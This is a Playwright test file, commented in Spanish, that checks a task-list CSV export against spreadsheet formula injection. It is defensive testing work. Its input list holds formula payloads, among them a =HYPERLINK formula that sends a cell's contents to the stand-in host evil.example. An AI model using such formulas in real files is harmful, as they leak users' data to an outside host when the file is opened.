import { test } from "@playwright/test";
import { entrarComo, escenario, expect, soloEscritorio } from "./apoyo";

test.beforeEach(() => {
  test.skip(soloEscritorio(test.info()), "contrato de seguridad: una pasada basta");
  test.setTimeout(120_000);
});

/*
 * Inyeccion de formulas: un titulo que empieza por = + - @ se ejecuta al abrir
 * el CSV en Excel o Sheets (HYPERLINK que filtra datos, DDE). La exportacion
 * de Equipo ya lo neutralizaba; la de la lista de tareas no.
 */
test("la exportacion CSV de tareas neutraliza formulas", async ({ context }) => {
  const e = await escenario("csv");
  const peligrosos = ['=HYPERLINK("http://evil.example/?d="&A1,"ver")', "+1+1", "-2+3", "@SUM(1)", "\t=1"];
  for (const t of peligrosos) await e.tarea(t, e.alfa, e.empleado, e.empleado);
  await entrarComo(context, e.empleado);
  const r = await context.request.get("/api/tareas/csv/exportar?alcance=mias");
  expect(r.status()).toBe(200);
  const csv = await r.text();
  for (const t of peligrosos) {
    const sano = `'${t}`;
    const celda = /[",\r\n]/.test(sano) ? `"${sano.replace(/"/g, '""')}"` : sano;
    expect(csv, t).toContain(celda);
  }
  // Ningun campo de datos empieza por un disparador de formula.
  const lineas = csv.trim().split("\r\n").slice(1);
  for (const l of lineas) expect(l, l).not.toMatch(/(^|,)"?[=+@]/);
});
